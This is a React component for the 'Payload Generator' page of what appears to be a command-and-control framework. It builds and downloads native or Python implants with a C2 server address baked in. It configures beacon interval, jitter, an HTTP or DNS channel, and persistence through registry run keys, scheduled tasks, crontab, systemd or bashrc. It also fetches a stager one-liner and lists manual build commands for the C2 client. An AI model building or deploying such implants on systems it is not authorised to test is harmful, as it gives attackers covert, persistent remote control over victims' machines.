import React, { useState } from "react";
import apiClient from "../../api/client";

const PayloadGenerator: React.FC = () => {
  const [targetOs, setTargetOs] = useState("linux");
  const [c2Server, setC2Server] = useState("");
  const [interval, setInterval_] = useState("10");
  const [jitter, setJitter] = useState("0.3");
  const [channel, setChannel] = useState("http");
  const [persist, setPersist] = useState("none");
  const [building, setBuilding] = useState(false);
  const [error, setError] = useState("");
  const [stager, setStager] = useState("");

  const handleBuild = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    setBuilding(true);
    try {
      const resp = await apiClient.post(
        "/dropper/build",
        {
          target_os: targetOs,
          c2_server: c2Server,
          interval: parseInt(interval, 10) || 10,
          jitter: parseFloat(jitter) || 0.3,
        },
        { responseType: "blob" }
      );
      const filename = targetOs === "windows" ? "C2Client.exe" : "c2client";
      const url = window.URL.createObjectURL(new Blob([resp.data]));
      const a = document.createElement("a");
      a.href = url;
      a.download = filename;
      a.click();
      window.URL.revokeObjectURL(url);
    } catch (err: any) {
      setError(err.response?.data?.detail || "Build failed");
    } finally {
      setBuilding(false);
    }
  };

  const handleGenerateAgent = async () => {
    setError("");
    setBuilding(true);
    try {
      const resp = await apiClient.post(
        "/dropper/agent",
        {
          target_os: targetOs,
          c2_server: c2Server,
          interval: parseInt(interval, 10) || 10,
          jitter: parseFloat(jitter) || 0.3,
          communication_channel: channel,
          persist,
        },
        { responseType: "blob" }
      );
      const filename = targetOs === "windows" ? "agent_windows.py" : "agent_linux.py";
      const url = window.URL.createObjectURL(new Blob([resp.data]));
      const a = document.createElement("a");
      a.href = url;
      a.download = filename;
      a.click();
      window.URL.revokeObjectURL(url);
    } catch (err: any) {
      setError(err.response?.data?.detail || "Agent generation failed");
    } finally {
      setBuilding(false);
    }
  };

  const handleStager = async () => {
    setError("");
    try {
      const resp = await apiClient.get(`/dropper/stager/${targetOs}`);
      setStager(resp.data);
    } catch (err: any) {
      setError(err.response?.data?.detail || "Failed to generate stager");
    }
  };

  return (
    <div>
      <h2>Payload Generator</h2>
      <p style={{ color: "#888", marginBottom: "1.5rem" }}>
        Build a native implant with the C2 server address baked in, or generate a stager one-liner.
      </p>

      <form onSubmit={handleBuild} className="module-form">
        <div className="form-row">
          <label>Target OS</label>
          <select value={targetOs} onChange={(e) => setTargetOs(e.target.value)}>
            <option value="linux">Linux</option>
            <option value="windows">Windows</option>
          </select>
        </div>
        <div className="form-row">
          <label>C2 Server (empty = auto-detect)</label>
          <input
            type="text"
            value={c2Server}
            onChange={(e) => setC2Server(e.target.value)}
            placeholder="10.0.0.1:8000"
          />
        </div>
        <div className="form-row">
          <label>Beacon Interval (s)</label>
          <input
            type="text"
            value={interval}
            onChange={(e) => setInterval_(e.target.value)}
            style={{ width: "80px" }}
          />
          <label>Jitter (0-1)</label>
          <input
            type="text"
            value={jitter}
            onChange={(e) => setJitter(e.target.value)}
            style={{ width: "80px" }}
          />
        </div>
        <div className="form-row">
          <label>Channel</label>
          <select value={channel} onChange={(e) => setChannel(e.target.value)}>
            <option value="http">HTTP</option>
            <option value="dns">DNS</option>
          </select>
          <label>Persistence</label>
          <select value={persist} onChange={(e) => setPersist(e.target.value)}>
            {targetOs === "windows" ? (
              <>
                <option value="none">None</option>
                <option value="registry">Registry Run Key</option>
                <option value="schtask">Scheduled Task</option>
              </>
            ) : (
              <>
                <option value="none">None</option>
                <option value="crontab">Crontab</option>
                <option value="systemd">Systemd Service</option>
                <option value="bashrc">Bashrc</option>
              </>
            )}
          </select>
        </div>
        <div style={{ display: "flex", gap: "0.75rem", marginTop: "0.5rem" }}>
          <button type="button" disabled={building} onClick={handleGenerateAgent}>
            {building ? "Generating ..." : "Python Agent"}
          </button>
          <button type="submit" disabled={building}>
            {building ? "Building ..." : "Native Build"}
          </button>
          <button type="button" className="btn-secondary" onClick={handleStager}>
            Stager
          </button>
        </div>
      </form>

      {error && <p className="error" style={{ marginTop: "1rem" }}>{error}</p>}

      {stager && (
        <div style={{ marginTop: "1.5rem" }}>
          <h3>Stager One-Liner</h3>
          <pre style={{ whiteSpace: "pre-wrap", wordBreak: "break-all" }}>{stager}</pre>
        </div>
      )}

      <div style={{ marginTop: "2rem" }}>
        <h3>Manual Build</h3>
        <div className="key-card">
          <dt>Linux</dt>
          <dd>
            <pre>
{`cd "C2 Client/linux"
make C2_SERVER=10.0.0.1:8000
# or with env var:
C2_SERVER=10.0.0.1:8000 ./c2client`}
            </pre>
          </dd>
          <dt>Windows</dt>
          <dd>
            <pre>
{`cd "C2 Client\\windows"
dotnet publish -c Release -r win-x64 --self-contained true ^
  /p:C2Server=10.0.0.1:8000
# or with env var:
set C2_SERVER=10.0.0.1:8000
C2Client.exe`}
            </pre>
          </dd>
        </div>
      </div>
    </div>
  );
};

export default PayloadGenerator;
